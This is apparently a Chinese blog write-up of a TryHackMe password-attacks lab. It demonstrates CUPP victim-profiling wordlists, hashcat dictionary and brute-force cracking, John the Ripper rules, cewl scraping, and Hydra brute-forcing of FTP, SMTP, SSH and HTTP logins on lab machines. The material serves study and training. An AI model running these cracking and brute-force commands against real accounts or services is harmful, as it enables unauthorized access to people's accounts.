<p>要运行 CUPP，我们需要安装 python 3。然后使用 git 将 GitHub 存储库克隆到本地计算机，如下所示：</p>
<pre><code class="hljs scss">git clone https://github.com/Mebus/cupp.git</code></pre>
<p>现在将当前目录更改为 CUPP 并运行 python3 <a target="_blank" rel="noopener" href="http://cupp.py">cupp.py</a> 或使用 -h 查看可用选项。</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/Tools/cupp]</span>
└─$ python cupp<span class="hljs-selector-class">.py</span> -h                                                                                                                                                       
usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

Common User Passwords Profiler

options:
  -h, --help         show this help message and exit
  -i, --interactive  Interactive questions for user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which were merged and
                     enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don<span class="hljs-string">'t print banner)</span></code></pre>
<p>CUPP 支持交互模式，它会询问有关目标的问题，并根据提供的答案创建自定义单词列表。如果您没有给定字段的答案，请按 Enter 键跳过它。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$  python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan<span class="hljs-keyword">@remote-exploit</span>.org ]
                            [ Mebus | <span class="hljs-attribute">https</span>://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don<span class="hljs-string">'t know all the info, just hit enter when asked! ;)</span>
<span class="hljs-string"></span>
<span class="hljs-string">&gt; First Name: </span>
<span class="hljs-string">&gt; Surname: </span>
<span class="hljs-string">&gt; Nickname: </span>
<span class="hljs-string">&gt; Birthdate (DDMMYYYY): </span>
<span class="hljs-string"></span>
<span class="hljs-string"></span>
<span class="hljs-string">&gt; Partners) name:</span>
<span class="hljs-string">&gt; Partners) nickname:</span>
<span class="hljs-string">&gt; Partners) birthdate (DDMMYYYY):</span>
<span class="hljs-string"></span>
<span class="hljs-string"></span>
<span class="hljs-string">&gt; Child'</span>s <span class="hljs-attribute">name</span>:
&gt; Child<span class="hljs-string">'s nickname:</span>
<span class="hljs-string">&gt; Child'</span>s birthdate (DDMMYYYY):


&gt; Pet<span class="hljs-string">'s name:</span>
<span class="hljs-string">&gt; Company name:</span>
<span class="hljs-string"></span>
<span class="hljs-string"></span>
<span class="hljs-string">&gt; Do you want to add some key words about the victim? Y/[N]:</span>
<span class="hljs-string">&gt; Do you want to add special chars at the end of words? Y/[N]:</span>
<span class="hljs-string">&gt; Do you want to add some random numbers at the end of words? Y/[N]:</span>
<span class="hljs-string">&gt; Leet mode? (i.e. leet = 1337) Y/[N]:</span>
<span class="hljs-string"></span>
<span class="hljs-string">[+] Now making a dictionary...</span>
<span class="hljs-string">[+] Sorting list and removing duplicates...</span>
<span class="hljs-string">[+] Saving dictionary to .....txt, counting ..... words.</span>
<span class="hljs-string">&gt; Hyperspeed Print? (Y/n)</span></code></pre>
<p>结果，会生成一个自定义单词列表，其中包含基于您的条目的各种数量的单词。预先创建的单词列表可以下载到您的计算机，如下所示：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$  python3 cupp.py -l
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan<span class="hljs-keyword">@remote-exploit</span>.org ]
                            [ Mebus | <span class="hljs-attribute">https</span>://github.com/Mebus/]


        Choose the section you want to <span class="hljs-attribute">download</span>:

     <span class="hljs-number">1</span>   Moby            <span class="hljs-number">14</span>      french          <span class="hljs-number">27</span>      places
     <span class="hljs-number">2</span>   afrikaans       <span class="hljs-number">15</span>      german          <span class="hljs-number">28</span>      polish
     <span class="hljs-number">3</span>   american        <span class="hljs-number">16</span>      hindi           <span class="hljs-number">29</span>      random
     <span class="hljs-number">4</span>   aussie          <span class="hljs-number">17</span>      hungarian       <span class="hljs-number">30</span>      religion
     <span class="hljs-number">5</span>   chinese         <span class="hljs-number">18</span>      italian         <span class="hljs-number">31</span>      russian
     <span class="hljs-number">6</span>   computer        <span class="hljs-number">19</span>      japanese        <span class="hljs-number">32</span>      science
     <span class="hljs-number">7</span>   croatian        <span class="hljs-number">20</span>      latin           <span class="hljs-number">33</span>      spanish
     <span class="hljs-number">8</span>   czech           <span class="hljs-number">21</span>      literature      <span class="hljs-number">34</span>      swahili
     <span class="hljs-number">9</span>   danish          <span class="hljs-number">22</span>      movieTV         <span class="hljs-number">35</span>      swedish
    <span class="hljs-number">10</span>   databases       <span class="hljs-number">23</span>      music           <span class="hljs-number">36</span>      turkish
    <span class="hljs-number">11</span>   dictionaries    <span class="hljs-number">24</span>      names           <span class="hljs-number">37</span>      yiddish
    <span class="hljs-number">12</span>   dutch           <span class="hljs-number">25</span>      net             <span class="hljs-number">38</span>      exit program
    <span class="hljs-number">13</span>   finnish         <span class="hljs-number">26</span>      norwegian


        Files will be downloaded from <span class="hljs-attribute">http</span>://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        <span class="hljs-attribute">Tip</span>: After downloading wordlist, you can improve it with -w option

&gt; Enter <span class="hljs-attribute">number</span>:</code></pre>
<p>根据您的兴趣，您可以从上面的列表中选择单词列表，以帮助生成用于暴力破解的单词列表！</p>
<p>最后，CUPP 还可以使用 -a 选项从 Alecto 数据库提供默认用户名和密码。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@thm</span>$  python3 cupp.py -a
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan<span class="hljs-keyword">@remote-exploit</span>.org ]
                            [ Mebus | <span class="hljs-attribute">https</span>://github.com/Mebus/]


[+] Checking if alectodb is <span class="hljs-keyword">not</span> present...
[+] Downloading alectodb.csv.gz from <span class="hljs-attribute">https</span>://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...

[+] Exporting to alectodb-usernames.txt <span class="hljs-keyword">and</span> alectodb-passwords.txt
[+] Done.</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217811.png" alt="image-20240714210122441"></p>
<h1 id="0x05-离线攻击-字典和暴力破解">0x05 离线攻击 - 字典和暴力破解</h1>
<p>本节讨论离线攻击，包括字典攻击、暴力攻击和基于规则的攻击。</p>
<h2 id="字典攻击">字典攻击</h2>
<p>字典攻击是一种通过使用众所周知的单词或短语来猜测密码的技术。字典攻击完全依赖于先前生成或找到的预先收集的单词列表。为了在这次攻击中取得成功，为你的目标选择或创建最佳候选单词列表非常重要。让我们探索使用您在之前有关生成单词列表的任务中学到的知识来执行字典攻击。我们将展示使用 hashcat 的离线字典攻击，hashcat 是一种流行的哈希破解工具。</p>
<p>假设我们获得以下哈希值f806fc5a2a0d5ba2471600758452799c，并且想要执行字典攻击来破解它。首先，我们至少需要了解以下内容:</p>
<ul>
<li>1- 这是什么类型的哈希？</li>
<li>2-我们将使用什么单词表？或者我们可以使用什么类型的攻击模式？</li>
</ul>
<p>为了识别哈希的类型，我们可以使用 hashid 或 hash-identifier 等工具。对于本例，hash-identifier 认为可能的哈希方法是 MD5。请注意，破解哈希值的时间取决于您使用的硬件（CPU 和/或 GPU）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217812.png" alt="image-20240715165112135"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217813.png" alt="image-20240715165104105"></p>
<p>两者对比，感觉还是第二个好点</p>
<pre><code class="hljs scss">hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">0</span> f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span></code></pre>
<blockquote>
<p>-a 0 设置攻击模式为字典攻击</p>
<p>-m 0 设置破解MD5哈希值的哈希模式；对于其他类型，请运行 hashcat -h 以获取支持的哈希列表。</p>
<p>f806fc5a2a0d5ba2471600758452799c 此选项可以是像我们的示例一样的单个哈希值，也可以是包含一个或多个哈希值的文件。</p>
<p>/usr/share/wordlists/rockyou.txt 用于我们攻击的 wordlist/dictionary 文件</p>
</blockquote>
<p>如果哈希值已被破解，我们使用 --show 选项运行 hashcat 以显示破解值：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217814.png" alt="image-20240715165529503"></p>
<p>结果破解值为rockyou</p>
<h2 id="蛮力攻击">蛮力攻击</h2>
<p>暴力破解是攻击者用来获取对个人帐户的未经授权的访问的常见攻击。此方法用于通过发送标准密码组合来猜测受害者的密码。字典和暴力攻击之间的主要区别在于字典攻击使用包含所有可能密码的单词列表。</p>
<p>相反，暴力攻击旨在尝试一个或多个字符的所有组合。例如，假设我们有一个需要未经授权访问的银行帐户。我们知道PIN包含4位数字作为密码。我们可以执行从 0000 到 9999 的暴力攻击，以根据这些知识猜测有效的 PIN。在其他情况下，可以将数字或字母序列添加到列表中的现有单词中，例如 admin0admin1, … admin9999.</p>
<p>例如，hashcat 具有可用于生成您自己的组合的字符集选项。字符集可以在 hashcat 帮助选项中找到。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hashcat --help
 ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
  d | <span class="hljs-number">0123456789</span>
  h | <span class="hljs-number">0123456789</span>abcdef
  H | <span class="hljs-number">0123456789</span>ABCDEF
  s |  !<span class="hljs-string">"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~</span>
<span class="hljs-string">  a | ?l?u?d?s</span>
<span class="hljs-string">  b | 0x00 - 0xff</span></code></pre>
<p>下面的示例展示了我们如何将 hashcat 与我们选择的暴力攻击模式结合使用。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hashcat -a <span class="hljs-number">3</span> ?d?d?d?d --stdout
<span class="hljs-number">1234</span>
<span class="hljs-number">0234</span>
<span class="hljs-number">2234</span>
<span class="hljs-number">3234</span>
<span class="hljs-number">9234</span>
<span class="hljs-number">4234</span>
<span class="hljs-number">5234</span>
<span class="hljs-number">8234</span>
<span class="hljs-number">7234</span>
<span class="hljs-number">6234</span>
..
..</code></pre>
<blockquote>
<p>-a 3 设置攻击方式为暴力攻击</p>
<p>?d?d?d?d ?d 告诉 hashcat 使用数字。在我们的例子中，?d?d?d?d 表示从 0000 开始到 9999 结束的四位数字</p>
<p>–stdout 将结果打印到终端</p>
</blockquote>
<p>现在让我们应用相同的概念来破解以下 MD5 哈希：05A5CF06982BA7892ED2A6D38FE832D6 一个四位数的 PIN 码。</p>
<pre><code class="hljs scss">hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">3</span> -m <span class="hljs-number">0</span> <span class="hljs-number">05</span>A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217815.png" alt="image-20240715175232882"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217816.png" alt="image-20240715175311116"></p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/nacos-docker]</span>
└─$ hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">100</span> <span class="hljs-number">8</span>d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--show</span>
<span class="hljs-number">8</span>d6e34f987851aa599257d3831a1af040886842f:sunshine</code></pre>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
└─$ hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">3</span> -m <span class="hljs-number">0</span> e48e13207341b6bffb7fb1622282247b ?d?d?d?d <span class="hljs-attr">--show</span>                           
e48e13207341b6bffb7fb1622282247b:<span class="hljs-number">1337</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217817.png" alt="image-20240715175555270"></p>
<h1 id="0x06-离线攻击-基于规则">0x06 离线攻击 - 基于规则</h1>
<h2 id="基于规则的攻击">基于规则的攻击</h2>
<p>基于规则的攻击也称为混合攻击。基于规则的攻击假设攻击者了解密码策略。规则用于在给定密码策略的指导范围内创建密码，并且理论上应该只生成有效的密码。在生成符合策略的密码时，使用预先存在的单词列表可能很有用 - 例如，操纵或“修改”密码，例如“password”：p@ssword、Pa$$wordPassw0rd 等。</p>
<p>对于这种攻击，我们可以使用 hashcat 或 John the ripper 来扩展我们的单词列表。然而，对于这次攻击，让我们看看开膛手约翰是如何工作的。通常，John the ripper 有一个包含规则集的配置文件，该文件位于 /etc/john/john.conf 或 /opt/john/john.conf，具体取决于您的发行版或 john 的安装方式。您可以阅读 /etc/john/john.conf 并查找 List.Rules 以查看所有可用规则：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ cat /etc/john/john.conf|grep <span class="hljs-string">"List.Rules:"</span> | cut -d<span class="hljs-string">"."</span> -f3 | cut -d<span class="hljs-string">":"</span> -f2 | cut -d<span class="hljs-string">"]"</span> -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-<span class="hljs-number">30000</span>
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
Jumbo
KoreLogic
T9</code></pre>
<p>我们可以看到我们有很多规则可供我们使用。我们将创建一个只有一个包含字符串 tryhackme 的密码的单词列表，看看如何扩展该单词列表。让我们选择一个规则，best64 规则，它包含最好的 64 条内置 John 规则，看看它能做什么！</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
Using default input <span class="hljs-attribute">encoding</span>: UTF-<span class="hljs-number">8</span>
Press <span class="hljs-string">'q'</span> <span class="hljs-keyword">or</span> Ctrl-C to abort, almost any other key for status
<span class="hljs-number">76</span>p <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">100.00%</span> (<span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">11</span> <span class="hljs-number">13</span>:<span class="hljs-number">42</span>) <span class="hljs-number">1266</span>p/s pordpo
<span class="hljs-number">76</span></code></pre>
<blockquote>
<p>–wordlist= 指定单词列表或词典文件。</p>
<p>–rules 指定要使用的规则。</p>
<p>–stdout 将输出打印到终端。</p>
<p>|wc -l 计算 John 产生了多少行.</p>
</blockquote>
<p>通过运行前面的命令，我们将密码列表从 1 个密码扩展到 76 个密码。现在让我们检查另一个规则，John 中最好的规则之一，KoreLogicKoreLogic 使用各种内置和自定义规则来生成复杂的密码列表。欲了解更多信息，<a target="_blank" rel="noopener" href="https://contest-2010.korelogic.com/rules.html">请访问此网站</a>。现在让我们使用这个规则来检查 Tryh@ckm3 是否在我们的列表中可用！</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep <span class="hljs-string">"Tryh@ckm3"</span>
Using default input <span class="hljs-attribute">encoding</span>: UTF-<span class="hljs-number">8</span>
Press <span class="hljs-string">'q'</span> <span class="hljs-keyword">or</span> Ctrl-C to abort, almost any other key for status
Tryh<span class="hljs-keyword">@ckm</span>3
<span class="hljs-number">7089833</span>p <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span> <span class="hljs-number">100.00%</span> (<span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">11</span> <span class="hljs-number">13</span>:<span class="hljs-number">56</span>) <span class="hljs-number">3016</span>Kp/s tryhackme999999</code></pre>
<p>上一个命令的输出显示我们的列表具有复杂版本的tryhackme，即Tryh@ckm3。最后，我们建议您查看所有规则并找到最适合您的规则。许多规则将组合应用于现有的单词列表并扩展单词列表以增加找到有效密码的机会！</p>
<p>开膛手约翰可以提供很多东西。例如，我们可以构建自己的规则并在运行时使用它，而 john 正在破解哈希或使用该规则构建自定义单词列表！</p>
<p>假设我们想要从预先存在的词典创建自定义单词列表，并对原始词典进行自定义修改。目标是在每个单词的开头添加特殊字符（例如：!@#$*&amp;），并在末尾添加数字 0-9。格式如下：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[symbols]</span>word<span class="hljs-selector-attr">[0-9]</span> <span class="hljs-selector-attr">[符号]</span>单词<span class="hljs-selector-attr">[0-9]</span></code></pre>
<p>我们可以将规则添加到 john.conf 的末尾:</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ sudo vi /etc/john/john.conf 
[List.<span class="hljs-attribute">Rules</span>:THM-Password-Attacks] 
Az<span class="hljs-string">"[0-9]"</span> ^[!@#$]</code></pre>
<blockquote>
<p>[List.Rules:THM-Password-Attacks]指定规则名称 THM-Password-Attacks。</p>
<p>Az 使用 -p 表示原始单词列表/字典中的单个单词.</p>
<p>“[0-9]”在单词末尾附加一个数字（从 0 到 9）。对于两位数，我们可以添<code>[0-9][0-9]</code>等。</p>
<p>^[!@#$] 在每个单词的开头添加一个特殊字符。 ^ 表示行/单词的开头。请注意，将 ^ 更改为 $ 会将特殊字符附加到行/单词的末尾。</p>
</blockquote>
<p>现在让我们创建一个包含单个单词password的文件，看看如何使用此规则扩展单词列表。</p>
<pre><code class="hljs scss">echo "password" &gt; /tmp/single<span class="hljs-selector-class">.lst</span></code></pre>
<p>我们使用 --rules 选项在 John 命令中包含我们创建的规则的名称。我们还需要在终端中显示结果。我们可以通过使用 --stdout 来做到这一点，如下所示：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
Using default input <span class="hljs-attribute">encoding</span>: UTF-<span class="hljs-number">8</span> 
!password0 
<span class="hljs-keyword">@password</span>0 
#password0 
<span class="hljs-variable">$password0</span></code></pre>
<p>现在是练习创建自己的规则的时候了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217818.png" alt="image-20240715181103328"></p>
<h1 id="0x07-部署虚拟机">0x07 部署虚拟机</h1>
<p>部署附加的虚拟机以应用我们在本会议室讨论的知识。连接的虚拟机有各种在线服务可以执行密码攻击。需要自定义单词列表来查找有效的凭据。</p>
<p>我们建议使用 <a target="_blank" rel="noopener" href="https://clinic.thmredteam.com/">https://clinic.thmredteam.com/</a> 创建您的自定义单词列表。</p>
<p>要使用 cewl 针对网站生成单词列表：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ cewl -m <span class="hljs-number">8</span> -w clinic.lst <span class="hljs-attribute">https</span>://clinic.thmredteam.com/</code></pre>
<p>请注意，您还需要生成一个用户名单词列表，如在线攻击问题的任务 3：密码分析 #1 中所示。</p>
<h2 id="在线密码攻击">在线密码攻击</h2>
<p>在线密码攻击涉及猜测使用用户名和密码身份验证方案的网络服务的密码，包括 HTTP、SSH、VNC、FTP、SNMP、POP3 等服务。本节展示使用 Hydra，这是攻击登录时使用的常用工具用于各种网络服务。</p>
<h3 id="hydra">Hydra</h3>
<p>Hydra 支持广泛的网络服务攻击。在本节中，我们将使用 Hydra 暴力破解网络服务，例如 Web 登录页面、FTP、SMTP 和 SSH。 通常，在 Hydra 中，每个服务都有自己的选项，并且 Hydra 期望的语法需要习惯。检查帮助选项以获取更多信息和功能非常重要。</p>
<h3 id="ftp">FTP</h3>
<p>在下面的场景中，我们将对 FTP 服务器执行暴力攻击。通过查看Hydra帮助选项，我们知道攻击FTP服务器的语法如下：</p>
<pre><code class="hljs scss">hydra -l ftp -<span class="hljs-selector-tag">P</span> passlist<span class="hljs-selector-class">.txt</span> ftp://<span class="hljs-number">10.10</span>.x.x</code></pre>
<blockquote>
<p>-l ftp 我们指定单个用户名，使用-L 作为用户名单词列表</p>
<p>-P Path 指定wordlist的完整路径，可以使用-p指定单个密码.</p>
<p><a href="ftp://10.10.x.x">ftp://10.10.x.x</a> 目标的协议和 IP 地址或完全限定域名 (FDQN)。</p>
</blockquote>
<p>请记住，有时您不需要暴力破解，可以先尝试默认凭据。尝试攻击连接的虚拟机上的 FTP 服务器并回答以下问题。</p>
<h3 id="smtp">SMTP</h3>
<p>与 FTP 服务器类似，我们也可以使用 Hydra 暴力破解 SMTP 服务器。语法与前面的示例类似。唯一的区别是目标协议。请记住，如果您想尝试其他在线密码攻击工具，您可能需要指定端口号，即 25。请务必阅读该工具的帮助选项。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hydra -l email<span class="hljs-keyword">@company</span>.xyz -P /path/to/wordlist.txt <span class="hljs-attribute">smtp</span>://<span class="hljs-number">10.10</span>.x.x -v 
Hydra (<span class="hljs-attribute">https</span>://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">03</span>:<span class="hljs-number">41</span>:<span class="hljs-number">08</span>
[INFO] several providers have implemented cracking protection, check with a small wordlist first - <span class="hljs-keyword">and</span> stay legal!
[DATA] max <span class="hljs-number">7</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">7</span> tasks, <span class="hljs-number">7</span> login tries (<span class="hljs-attribute">l</span>:<span class="hljs-number">1</span>/<span class="hljs-attribute">p</span>:<span class="hljs-number">7</span>), ~<span class="hljs-number">1</span> try per task
[DATA] attacking <span class="hljs-attribute">smtp</span>://<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">25</span>/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[<span class="hljs-number">25</span>][smtp] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.10</span>.x.x   <span class="hljs-attribute">login</span>: email<span class="hljs-keyword">@company</span>.xyz <span class="hljs-attribute">password</span>: xxxxxxxx
[STATUS] attack finished for <span class="hljs-number">10.10</span>.x.x (waiting for children to complete tests)
<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found</code></pre>
<h3 id="ssh">SSH</h3>
<p>如果您的服务器可以访问 Internet，则 SSH 暴力破解可能很常见。 Hydra 支持许多协议，包括 SSH。我们可以使用前面的语法来执行我们的攻击！值得注意的是，密码攻击依赖于拥有出色的单词列表来增加找到有效用户名和密码的机会。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hydra -L users.lst -P /path/to/wordlist.txt <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.10</span>.x.x -v
 
Hydra v8.<span class="hljs-number">6</span> (c) <span class="hljs-number">2017</span> by van Hauser/THC - Please do <span class="hljs-keyword">not</span> use in military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> for illegal purposes. 

Hydra (<span class="hljs-attribute">https</span>://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">03</span>:<span class="hljs-number">48</span>:<span class="hljs-number">00</span>
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the <span class="hljs-attribute">tasks</span>: use -t <span class="hljs-number">4</span>
[DATA] max <span class="hljs-number">8</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">8</span> tasks, <span class="hljs-number">8</span> login tries (<span class="hljs-attribute">l</span>:<span class="hljs-number">1</span>/<span class="hljs-attribute">p</span>:<span class="hljs-number">8</span>), ~<span class="hljs-number">1</span> try per task
[DATA] attacking <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">22</span>/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by <span class="hljs-attribute">ssh</span>://user@<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">22</span>
[INFO] Successful, password authentication is supported by <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">22</span>
[<span class="hljs-number">22</span>][ssh] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.10</span>.x.x   <span class="hljs-attribute">login</span>: victim   <span class="hljs-attribute">password</span>: xxxxxxxx
[STATUS] attack finished for <span class="hljs-number">10.10</span>.x.x (waiting for children to complete tests)
<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found</code></pre>
<h3 id="http-登录页面">HTTP 登录页面</h3>
<p>在这种情况下，我们将暴力破解 HTTP 登录页面。为此，首先，您需要了解您正在暴力破解什么。使用 Hydra，指定 HTTP 请求的类型非常重要，无论是 GET 还是 POST。检查 Hydra 选项： Hydra http-get-form -U，我们可以看到 Hydra 的 http-get-form 选项语法如下：</p>
<pre><code class="hljs scss">&lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
//&lt;url&gt;:&lt;表单参数&gt;:&lt;条件字符串&gt;[:&lt;可选&gt;[:&lt;可选&gt;]</code></pre>
<p>正如我们之前提到的，我们需要分析需要发送的 HTTP 请求，这可以通过使用浏览器开发工具或使用 Web 代理（例如 Burp Suite）来完成。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hydra -l admin -P <span class="hljs-number">500</span>-worst-passwords.txt <span class="hljs-number">10.10</span>.x.x http-get-form <span class="hljs-string">"/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php"</span> -f 
Hydra v8.<span class="hljs-number">6</span> (c) <span class="hljs-number">2017</span> by van Hauser/THC - Please do <span class="hljs-keyword">not</span> use in military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> for illegal purposes. 

Hydra (<span class="hljs-attribute">http</span>://www.thc.org/thc-hydra) starting at <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">22</span> 
[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">500</span> login tries (<span class="hljs-attribute">l</span>:<span class="hljs-number">1</span>/<span class="hljs-attribute">p</span>:<span class="hljs-number">500</span>), ~<span class="hljs-number">32</span> tries per task 
[DATA] attacking <span class="hljs-attribute">http-get-form</span>://<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">80</span>//login-get/index.<span class="hljs-attribute">php</span>:username=^USER^&amp;password=^PASS^:S=logout.php 
[<span class="hljs-number">80</span>][http-get-form] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.10</span>.x.x   <span class="hljs-attribute">login</span>: admin <span class="hljs-attribute">password</span>: xxxxxx 
